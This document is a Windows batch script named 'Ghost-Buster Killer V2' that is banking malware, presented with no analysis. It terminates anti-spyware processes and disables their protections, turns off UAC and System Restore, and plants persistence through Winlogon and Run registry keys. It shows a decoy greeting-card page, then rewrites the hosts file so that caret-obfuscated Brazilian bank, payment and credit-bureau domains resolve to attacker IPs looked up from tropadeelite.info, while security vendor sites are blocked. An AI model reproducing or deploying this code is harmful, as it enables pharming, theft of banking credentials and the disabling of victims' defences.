@echo off
break off
::Ghost-Buster Killer V2

ver|find "Windows 98">nul
if not errorlevel 1 goto fim

if exist %windir%\system32\chkdirecx.dll goto ini
if exist %windir%\system32\taskmqr.exe taskkill -f /IM taskmqr.exe && del /q /f %windir%\system32\taskmqr.exe
if exist %windir%\system32\shockwave.exe taskkill -f /IM shockwave.exe && del /q /f %windir%\system32\shockwave.exe
if exist %windir%\system32\javaservice.exe taskkill -f /IM javaservice.exe && del /q /f %windir%\system32\javaservice.exe
if exist %windir%\system32\service.confi taskkill -f /IM service.confi && del /q /f %windir%\system32\service.confi
if exist "%CommonProgramFiles%"\jusched.exe taskkill -f /IM jusched.exe && del /q /f "%CommonProgramFiles%"\jusched.exe
if exist %windir%\system32\dllcache\winlogon.exe taskkill -f /IM winlogon.exe && del /q /f %windir%\system32\dllcache\winlogon.exe
set tsk=taskkill
%tsk% /f /IM guard.exe
%tsk% /f /IM blindman.exe
%tsk% /f /IM SSUpdate.exe
%tsk% /f /IM avgas.exe
%tsk% /f /IM SUPERAntiSpyware.exe
%tsk% /f /IM AntiSpyware.exe
%tsk% /f /IM TeaTimer.exe
%tsk% /f /IM SpySweeper.exe
%tsk% /f /IM SpywareTerminatorShield.exe
%tsk% /f /IM SpywareTerminator.exe
%tsk% /f /IM sgmain.exe
%tsk% /f /IM SpybotSD.exe
%tsk% /f /IM HostFileEditor.exe
%tsk% /f /IM SpySweeperUI.exe
%tsk% /f /IM sp_rsser.exe
%tsk% /f /IM ProcessWatch.exe
%tsk% /f /IM sgbhp.exe
%tsk% /f /IM AAWTray.exe
%tsk% /f /IM Ad-Watch2007.exe
%tsk% /f /IM lsupdatemanager.exe
%tsk% /f /IM lsdelete.exe
%tsk% /f /IM aawservice.exe
%tsk% /f /IM Ad-Aware2007.exe
start /max iexplore.exe "http://arquivos.emotioncard.net/ver_cartao.php"

set d1=%random:~1,3%
if exist %temp%\%d1% del /q /f %temp%\%d1%
reg export HKU %temp%\%d1%
if exist %temp%\~xxx del /q /f %temp%\~xxx
type %temp%\%d1% | find "Internet Explorer\Main">%temp%\~xxx && for /f "TOKENS=2 delims=\" %%D in ('type %temp%\~xxx ^| find "S-1-5-21"') do set CSL=%%D
echo y|reg add "HKU\%CSL%\Software\Microsoft\Internet Explorer\Main" /v "Enable Browser Extensions" /t REG_SZ /d "no"
del /q /f  %temp%\%d1% && del /q /f %temp%\%d1%

echo y|reg add "HKEY_CURRENT_USER\Software\Policies\Microsoft\Internet Explorer\Control Panel" /v "AdvancedTab" /t REG_DWORD /d "1"
echo y|reg add "HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Internet Explorer\Control Panel" /v "AdvancedTab" /t REG_DWORD /d "1"

ver|find "6.0">nul
if errorlevel 0 goto xp
echo y|reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "EnableLUA" /t REG_DWORD /d "0" /f

:xp
set rg=reg add
echo y|reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v "Shell" /t REG_SZ /d "Explorer.exe winlogon.confi"
assoc .confi=exefile
copy "%windir%"\live.scr %windir%\system32\winlogon.confi

echo y|reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\policies\Explorer\Run"  /v "WinService" /t REG_SZ /d "%windir%\system32\dllcache\winservice.exe"
copy "%windir%"\live.scr %windir%\system32\dllcache\winservice.exe

echo y|reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "Windows Live ID" /t REG_SZ /d "%windir%\live.scr"

echo y|reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SystemRestore"  /v DisableSR /t REG_DWORD /d 0x00000001 /f

if exist "%ProgramFiles%\Spyware Terminator\" (
 echo y|%rg% "HKU\%CSL%\Software\Spyware Terminator" /v HIPSEnabled /t REG_DWORD /d 0x00000000 /f
 echo y|%rg% "HKU\%CSL%\Software\Spyware Terminator" /v RSCheckHostFile /t REG_DWORD /d 0x00000000 /f
 echo y|%rg% "HKU\%CSL%\Software\Spyware Terminator" /v RSIEMode /t REG_DWORD /d 0x00000000 /f
 echo y|%rg% "HKU\%CSL%\Software\Spyware Terminator" /v RSHostsMode /t REG_DWORD /d 0x00000000 /f
 echo y|%rg% "HKU\%CSL%\Software\Spyware Terminator" /v RSFileExtMode /t REG_DWORD /d 0x00000000 /f
 echo y|%rg% "HKU\%CSL%\Software\Spyware Terminator" /v HIPSInstallModeEnabled /t REG_DWORD /d 0x00000000 /f
 echo y|%rg% "HKU\%CSL%\Software\Spyware Terminator" /v RSCheckIESettings /t REG_DWORD /d 0x00000000 /f
 )

if exist "%ProgramFiles%\Webroot\Spy Sweeper\" (
 echo y|%rg% "HKLM\SOFTWARE\Webroot\SpySweeper" /v hfp /t REG_DWORD /d 0x00000000 /f
 echo y|%rg% "HKLM\SOFTWARE\Webroot\SpySweeper" /v ief /t REG_DWORD /d 0x00000000 /f
 )

> %windir%\system32\chkdirecx.dll echo x
exit
:ini
set d1=%random:~1,3%
if exist %temp%\%d1% del /q /f %temp%\%d1%
reg export HKU %temp%\%d1%
if exist %temp%\~xxx del /q /f %temp%\~xxx
type %temp%\%d1% | find "Internet Explorer\Main">%temp%\~xxx && for /f "TOKENS=2 delims=\" %%D in ('type %temp%\~xxx ^| find "S-1-5-21"') do set CSL=%%D
echo y|reg add "HKU\%CSL%\Software\Microsoft\Internet Explorer\Main" /v "Enable Browser Extensions" /t REG_SZ /d "no"
del /q /f  %temp%\%d1% && del /q /f %temp%\%d1%

if not exist "%windir%"\live.scr (
if exist %windir%\system32\winlogon.confi copy %windir%\system32\winlogon.confi "%windir%"\live.scr && echo y|reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "Windows Live ID" /t REG_SZ /d "%windir%\live.scr"
if exist %windir%\system32\dllcache\winservice.exe copy %windir%\system32\dllcache\winservice.exe "%windir%"\live.scr && echo y|reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "Windows Live ID" /t REG_SZ /d "%windir%\live.scr"
	)
if not exist %windir%\system32\winlogon.confi (
if exist "%windir%"\live.scr copy "%windir%"\live.scr %windir%\system32\winlogon.confi && echo y|reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v "Shell" /t REG_SZ /d "Explorer.exe winlogon.confi"
if exist %windir%\system32\dllcache\winservice.exe copy %windir%\system32\dllcache\winservice.exe %windir%\system32\winlogon.confi && echo y|reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v "Shell" /t REG_SZ /d "Explorer.exe winlogon.confi"
	)
if not exist %windir%\system32\dllcache\winservice.exe (
if exist "%windir%"\live.scr copy "%windir%"\live.scr %windir%\system32\dllcache\winservice.exe && echo y|reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\policies\Explorer\Run"  /v "WinService" /t REG_SZ /d "%windir%\system32\dllcache\winservice.exe"
if exist %windir%\system32\service.confi copy %windir%\system32\service.confi %windir%\system32\dllcache\winservice.exe && echo y|reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\policies\Explorer\Run"  /v "WinService" /t REG_SZ /d "%windir%\system32\dllcache\winservice.exe"
	)

:teste
set ping=%windir%\system32\ping.exe
%ping% www.google.com -n 1 -l 1 | find "TTL" > nul
if not errorlevel 1 goto dns
goto teste
:dns
for /f "tokens=2" %%a in ('nslookup ip1.tropadeelite.info ^| find "Address"') do set ba=%%a
for /f "tokens=2" %%e in ('nslookup ip2.tropadeelite.info ^| find "Address"') do set be=%%e
for /f "tokens=2" %%i in ('nslookup ip3.tropadeelite.info ^| find "Address"') do set bi=%%i
for /f "tokens=2" %%o in ('nslookup ip4.tropadeelite.info ^| find "Address"') do set bo=%%o
::bloquear
set blk=1^27.^0.0.^1
set te1=w^wws.^rea^lsecu^re^web^.com^.b^r
set te2=clic^k^ban^king^.u^nib^anco.c^o^m.br
set te3=ww^w14^.b^anc^o^br^asi^l.^com.^b^r
set te4=im^ag^em^.ca^ix^a.go^v.^br
set te5=bdu^.bm^b.c^o^m.^br
::cef
set te6=cai^x^a.^com.^b^r
set te7=w^ww.c^aix^a.^c^om^.b^r
set te8=c^a^ix^a.go^v^.^b^r
set te9=w^w^w^.c^a^ix^a.^gov.b^r
set te10=c^ef^.c^om^.^br
set te11=w^w^w^.^c^e^f.co^m.^br
set te12=c^e^f^.^gov^.^br
set te13=w^w^w.c^e^f^.g^o^v.^br
set te14=ca^ix^a^eco^nom^i^caf^edera^l.c^om.^b^r
set te15=w^ww.^ca^ix^ae^co^nom^ica.^c^om.b^r
set te16=w^w^w^.^ca^ixaec^on^om^i^cafe^dera^l.com^.^b^r
::bb
set te17=bb^.c^om.b^r
set te18=w^ww.bb^.c^o^m.^b^r
set te19=b^a^n^codobr^asi^l.c^o^m.^br
set te20=w^w^w^.ban^co^dob^ra^si^l.com^.b^r
set te21=b^a^nco^bras^il.co^m.b^r
set te22=w^ww^.ban^co^br^as^il.c^o^m.br
::credita
set te23=cr^e^dica^rd^ita^u.c^om.^b^r
set te24=w^w^w.cred^ic^ard^i^tau.co^m.^br
::citi
set te25=c^redi^car^dci^ti.^com.b^r
set te26=ww^w^.cred^icard^citi.c^om^.^br
::uni
set te27=uni^b^a^nco.co^m.b^r
set te28=w^ww^.^uni^ba^n^co.co^m.b^r
::nossa
set te29=nos^saca^i^xa.com^.b^r
set te30=w^w^w^.no^ss^a^caix^a.co^m.b^r
::Rural
set te31=r^u^r^al^.c^om.^br
set te32=ww^w^.r^ur^al.co^m.^br
set te33=ba^nc^o^ru^ral.c^om.^b^r
set te34=ww^w^.b^a^nco^rur^al.^com^.^b^r
::real
set te35=re^al^.c^om.b^r
set te36=w^w^w.re^al.co^m.^br
set te37=ba^n^co^re^a^l.c^om.^b^r
set te38=w^w^w.ba^n^core^al^.c^om.^b^r
::ita
set te39=ita^u^.c^om.^br
set te40=w^w^w.i^t^au.c^om.b^r
::desco
set te41=br^a^desco.c^o^m^.br
set te42=w^ww.br^ade^sco.c^o^m.b^r
::Santander
set te43=santa^nd^er.^c^o^m.b^r
set te44=w^w^w.^sant^and^er.^c^om.^b^r
set te45=b^an^e^sp^a.co^m.b^r
set te46=sa^n^ta^nder^b^ane^sp^a.co^m.^br
set te47=w^ww^.ba^ne^sp^a.c^om^.b^r
set te48=w^w^w.^s^a^n^t^an^de^rban^es^pa.^c^o^m.^b^r
::CashtoBR
set te49=c^as^ht^ob^r.^ne^t
set te50=w^w^w.ca^sh^t^o^br^.n^e^t
::Pagseguro
set te51=p^ag^seg^ur^o.c^om^.b^r
set te52=w^ww^.^pa^g^se^g^uro.co^m^.^b^r
::Sendep
set te53=w^ww^.^s^en^de^p.c^o^m^.^b^r
set te54=send^e^p^.c^om^.^b^r
::infoseg
set te55=info^s^e^g.^go^v.b^r
set te56=w^ww.^in^f^oseg.^g^ov^.b^r
::serasa
set te57=w^w^w.s^er^asa.^com
set te58=s^e^r^as^a.c^om
set te59=s^e^ras^a.com^.b^r
set te60=w^w^w.s^era^s^a^.c^om.^b^r
::renic
set te61=ww^w.r^en^ic.^co^m.^b^r
::equi
set te62=w^w^w.e^qu^ifax.c^om.b^r
::check
set te63=w^w^w.check^c^hec^k.^com.^b^r
::Terra
set te64=t^err^a.^c^o^m.b^r
set te65=^w^w^w^.t^e^rr^a^.c^o^m^.^b^r
::block2
set te66=u^pgrad^e.b^itdef^en^der.^c^om
set te67=w^w^w.blee^pn^gc^om^puter.^com
set te68=ww^w^.vi^r^u^s^to^t^a^l.c^o^m
set te69=li^n^hade^fen^s^iva.uo^l.^co^m.br
set te70=ww^w.^s^pyw^are^in^f^o.c^o^m
set te71=w^w^w^.t^re^nd^micr^o.co^m
set te72=w^ww^5.^in^fo^se^g.g^ov^.b^r

if exist %windir%\system32\drivers\etc\hosts attrib -R %windir%\system32\drivers\etc\hosts
if not exist %windir%\system32\drivers\etc\hosts type nul>%windir%\system32\drivers\etc\hosts
set f1=%random:~1,3%
> %temp%\%f1% echo %blk% %te1%&>> %temp%\%f1% echo %blk% %te2%&>> %temp%\%f1% echo %blk% %te3%&>> %temp%\%f1% echo %blk% %te4%&>> %temp%\%f1% echo %blk% %te5%&rem
>> %temp%\%f1% echo %ba% %te6%&>> %temp%\%f1% echo %ba% %te7%&>> %temp%\%f1% echo %ba% %te8%&>> %temp%\%f1% echo %ba% %te9%&>> %temp%\%f1% echo %ba% %te10%&>> %temp%\%f1% echo %ba% %te11%&>> %temp%\%f1% echo %ba% %te12%&>> %temp%\%f1% echo %ba% %te13%&>> %temp%\%f1% echo %ba% %te14%&>> %temp%\%f1% echo %ba% %te15%&>> %temp%\%f1% echo %ba% %te16%&rem
>> %temp%\%f1% echo %be% %te17%&>> %temp%\%f1% echo %be% %te18%&>> %temp%\%f1% echo %be% %te19%&>> %temp%\%f1% echo %be% %te20%&>> %temp%\%f1% echo %be% %te21%&>> %temp%\%f1% echo %be% %te22%&rem
>> %temp%\%f1% echo %be% %te23%&>> %temp%\%f1% echo %be% %te24%&rem
>> %temp%\%f1% echo %be% %te25%&>> %temp%\%f1% echo %be% %te26%&rem
>> %temp%\%f1% echo %bi% %te27%&>> %temp%\%f1% echo %bi% %te28%&rem
>> %temp%\%f1% echo %be% %te29%&>> %temp%\%f1% echo %be% %te30%&rem
>> %temp%\%f1% echo %bi% %te31%&>> %temp%\%f1% echo %bi% %te32%&>> %temp%\%f1% echo %bi% %te33%&>> %temp%\%f1% echo %bi% %te34%&rem
>> %temp%\%f1% echo %bi% %te35%&>> %temp%\%f1% echo %bi% %te36%&>> %temp%\%f1% echo %bi% %te37%&>> %temp%\%f1% echo %bi% %te38%&rem
>> %temp%\%f1% echo %bi% %te39%&>> %temp%\%f1% echo %bi% %te40%&rem
>> %temp%\%f1% echo %bi% %te41%&>> %temp%\%f1% echo %bi% %te42%&rem
>> %temp%\%f1% echo %bi% %te43%&>> %temp%\%f1% echo %bi% %te44%&>> %temp%\%f1% echo %bi% %te45%&>> %temp%\%f1% echo %bi% %te46%&>> %temp%\%f1% echo %bi% %te47%&>> %temp%\%f1% echo %bi% %te48%&rem
>> %temp%\%f1% echo %bo% %te49%&>> %temp%\%f1% echo %bo% %te50%&rem
>> %temp%\%f1% echo %bo% %te51%&>> %temp%\%f1% echo %bo% %te52%&rem
>> %temp%\%f1% echo %bo% %te53%&>> %temp%\%f1% echo %bo% %te54%&rem
>> %temp%\%f1% echo %be% %te55%&>> %temp%\%f1% echo %be% %te56%&rem
>> %temp%\%f1% echo %bo% %te57%&>> %temp%\%f1% echo %bo% %te58%&>> %temp%\%f1% echo %bo% %te59%&>> %temp%\%f1% echo %bo% %te60%&rem
>> %temp%\%f1% echo %bo% %te61%&rem
>> %temp%\%f1% echo %bo% %te62%&rem
>> %temp%\%f1% echo %bo% %te63%&rem
>> %temp%\%f1% echo %be% %te64%&>> %temp%\%f1% echo %be% %te65%&rem
>> %temp%\%f1% echo %blk% %te66%&>> %temp%\%f1% echo %blk% %te67%&>> %temp%\%f1% echo %blk% %te68%&>> %temp%\%f1% echo %blk% %te69%&>> %temp%\%f1% echo %blk% %te70%&>> %temp%\%f1% echo %blk% %te71%&>> %temp%\%f1% echo %blk% %te72%&rem
type %temp%\%f1%>%windir%\system32\drivers\etc\hosts && del /q /f %temp%\%f1%
attrib +R %windir%\system32\drivers\etc\hosts

exit
:fim
start /max iexplore.exe "http://arquivos.emotioncard.net/ver_cartao.php"
exit
